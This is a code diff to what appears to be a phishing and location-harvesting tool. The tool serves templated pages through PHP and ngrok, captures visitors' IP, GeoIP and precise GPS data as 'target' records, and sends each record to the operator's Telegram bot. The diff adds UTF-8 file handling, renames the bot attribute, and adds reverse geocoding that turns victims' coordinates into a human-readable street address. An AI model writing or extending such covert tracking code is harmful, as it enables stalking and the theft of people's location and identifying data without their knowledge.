@@ -19,6 +19,7 @@ from Modules.editIndexFile import EditIndexFile
 from Modules.geoip import GeolocationIP
 from Modules.loadTemplates import loadTemplatePath
 from Modules.notifier import TelegramBot
+from Modules.reverseGeocodingAPI import ReverseGeocoding
 from Modules.timeOptions import TimeOptions
 
 if name == "nt":
@@ -135,7 +136,7 @@ def press_enter():
 
 
 def get_link():
-    username = getlogin()
+    username = uname()[1]
     cwd = current_working_dir()
     proto_li = ["http://", "https://"]
     banner()
@@ -181,7 +182,7 @@ def home_options():
 
 def start():
     icons_path = "./Modules/icons/"
-    username = getlogin()
+    username = uname()[1]
     cwd = current_working_dir()
     _del_ = DeleteFilesAndDirs()
     t_print = TmPrint()
@@ -341,7 +342,7 @@ class MainServer:
         try:
             self.t_print.out(LG + " [>] Starting PHP server on port" + LW + f" ({self.def_port})")
             sleep(1)
-            with open("./Logs/PHP-Log/PHP_SERVER_LOG.log", "w") as php_log:
+            with open("./Logs/PHP-Log/PHP_SERVER_LOG.log", "w", encoding="UTF-8") as php_log:
                 Popen(("php", "-S", f"localhost:{self.def_port}", "-t", self.template_path),
                       stderr=php_log, stdout=php_log)
                 self.t_print.out(LG + " [>] Generating the link...")
@@ -361,7 +362,7 @@ class MainServer:
                 sleep(0.4)
                 self.t_print.out(LG + " [>] Sending the link to your" + LW + " telegram" + LG + " ... ")
                 try:
-                    self.telebot.sendMessage(
+                    self.tele_bot.sendMessage(
                         f"✅ New link created!\n\n🌐 Template name : {template_name}\n🔗 Link : {link}" +
                         f"\n🕐 Time : {self.time_opt.calendar} {self.time_opt.clock}")
                     self.t_print.out(
@@ -379,13 +380,13 @@ class MainServer:
                 print("\n\n" + LY + " [!] Something went wrong while creating the link!\n")
             else:
                 print("\n\n" + LR + " [#MainServer] ERROR : " + str(error))
-            self.telebot.sendMessage(f"❌ Link expired!\n\n🌐 Template name : {template_name}" +
+            self.tele_bot.sendMessage(f"❌ Link expired!\n\n🌐 Template name : {template_name}" +
                                      f"\n🕐 Time : {self.time_opt.calendar} {self.time_opt.clock}")
             press_enter()
             self.kill_php()
             ngrok.kill()
         except KeyboardInterrupt:
-            self.telebot.sendMessage(f"❌ Link expired!\n\n🌐 Template name : {template_name}" +
+            self.tele_bot.sendMessage(f"❌ Link expired!\n\n🌐 Template name : {template_name}" +
                                      f"\n🕐 Time : {self.time_opt.calendar} {self.time_opt.clock}")
             self.kill_php()
 
@@ -395,14 +396,14 @@ class MainServer:
         if name != "nt":
             pass
         else:
-            with open("./Logs/PHP-Log/TERMINATE_PHP_LOG.log", "w") as kill_process:
+            with open("./Logs/PHP-Log/TERMINATE_PHP_LOG.log", "w", encoding="UTF-8") as kill_process:
                 Popen(("taskkill", "/F", "/IM", "php*"), stdout=kill_process, stderr=kill_process)
 
     @staticmethod
     def get_ip_addr():
         file_path_ip = "./Logs/Saved-IP/IP-Address.txt"
         if stat(file_path_ip).st_size != 0:
-            with open(file_path_ip, "r") as ip_file:
+            with open(file_path_ip, "r", encoding="UTF-8") as ip_file:
                 file_lines = ip_file.readlines()
                 target_ip = file_lines[-1]
             return target_ip
@@ -434,18 +435,18 @@ class MainServer:
                                     f" {number_of_target} " + LB + "-----" + LY + " !> ")
                         print(LG + f"\n\n [>] IP   : " + LW + f"{target_ip}" +
                               LG + " [>] Time : " + LW + f"{self.time_opt.calendar} | {self.time_opt.clock}")
-                        with open(file_path_ip, "w") as clean_ip_file:
+                        with open(file_path_ip, "w", encoding="UTF-8") as clean_ip_file:
                             clean_ip_file.write("")
                     t_print.out(LG + " [>] Saving target GeoIP data... ")
                     sleep(2)
                     if stat(file_path_info).st_size != 0:
-                        with open(file_path_info, "r") as info_file:
+                        with open(file_path_info, "r", encoding="UTF-8") as info_file:
                             info_content = info_file.read()
                         info_data = loads(info_content)["info"]
                         ip_data = GeolocationIP(target_ip)
                         ip_data = ip_data.getData
                         full_target_data = implement_userdata(info_data, ip_data)
-                        with open(target_data_file, "w") as target_info:
+                        with open(target_data_file, "w", encoding="UTF-8") as target_info:
                             target_info.write(full_target_data)
                         t_print.out(LG + f" [>] Target GeoIP data successfully saved in" +
                                     LW + f" [{target_data_file}]" + LG + " &" +
@@ -463,7 +464,7 @@ class MainServer:
                         if stat(file_path_loc).st_size != 0:
                             t_print.out(LG + " [>] Saving target Location data... ")
                             sleep(2)
-                            with open(file_path_loc, "r") as loc_file:
+                            with open(file_path_loc, "r", encoding="UTF-8") as loc_file:
                                 loc_content = loc_file.read()
                             loc_data = loads(loc_content)["loc_info"]
                             latitude = loc_data["latitude"]
@@ -472,30 +473,34 @@ class MainServer:
                             altitude = loc_data["altitude"]
                             direction = loc_data["direction"]
                             speed = loc_data["speed"]
-                            with open(target_data_file, "a") as target_info:
+                            address = ReverseGeocoding.reverse(latitude, longitude)["display_name"]
+                            with open(target_data_file, "a", encoding="UTF-8") as target_info:
                                 target_info.write("\n\n[------ Location Info ------] \n\n" +
                                                   f"-> Latitude : {latitude}\n-> Longitude : {longitude}\n" +
                                                   f"-> Altitude : {altitude}\n-> Speed : {speed}\n" +
                                                   f"-> Direction : {direction}\n-> Accuracy : {accuracy}\n" +
-                                                  f"-> Google Maps Link : google.com/maps/place/{latitude}+{longitude}")
-                            with open(file_path_loc, "w") as loc_file:
+                                                  f"-> Google Maps Link : google.com/maps/place/{latitude}+{longitude}\n" + 
+                                                  f"-> Human-Readable Address: {address}")
+                            with open(file_path_loc, "w", encoding="UTF-8") as loc_file:
                                 loc_file.write("")
                             t_print.out(LG + " [>] Target Location data successfully appended to " +
                                         LW + f"[{target_data_file}]")
                             print("")
                         else:
-                            t_print.out(LG + " [>] Target Location data could not be saved!")
+                            t_print.out(LR + " [>]" + 
+                                        LY + " Target " + LW + "Location data" + 
+                                        LY + " could not be saved!")
                             print("")
                     else:
                         continue
                     try:
                         t_print.out(LG + " [>] Sending target data to your" + LW + " telegram" + LG + " ...")
-                        with open(target_data_file, "r") as data:
+                        with open(target_data_file, "r", encoding="UTF-8") as data:
                             image_data = Data2Image(f"./Target-Data/IMG_T{number_of_target}.png")
                             image_data.write_image(data.read().replace("------", ""), "./Modules/fonts/arial.ttf",
                                                    25, "RGB", (1024, 1024), (250, 97, 97),
                                                    (255, 255, 255))
-                            self.telebot.sendDocument(target_data_file,
+                            self.tele_bot.sendDocument(target_data_file,
                                                       caption=f"*Target Number*: `{number_of_target}`\n" +
                                                               f"*Template name*: `{template_name}`\n"
                                                               f"*Time*: {self.time_opt.calendar} {self.time_opt.clock}",
@@ -517,7 +522,8 @@ class MainServer:
             except Exception as error:
                 print("\n\n" + LR + " [#getUserData] ERROR : " + str(error))
                 exit()
-
+            except KeyboardInterrupt:
+                exit()
 
 def implement_userdata(info_data: dict, ip_data: dict):
     full_target_data = "[------ GeolocationIP Info ------] \n\n" \
